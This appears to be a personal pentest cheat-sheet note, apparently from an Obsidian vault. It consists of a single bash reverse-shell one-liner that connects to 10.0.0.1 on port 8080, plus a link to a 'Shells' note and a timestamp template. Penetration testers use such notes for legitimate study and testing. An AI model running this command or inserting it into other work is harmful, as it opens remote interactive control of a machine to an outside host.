---
category: Uncategorized
tags: [pentest]
created: 2024-12-21

---
### Reverse shell with bash
```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

[[´Shells]]


Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
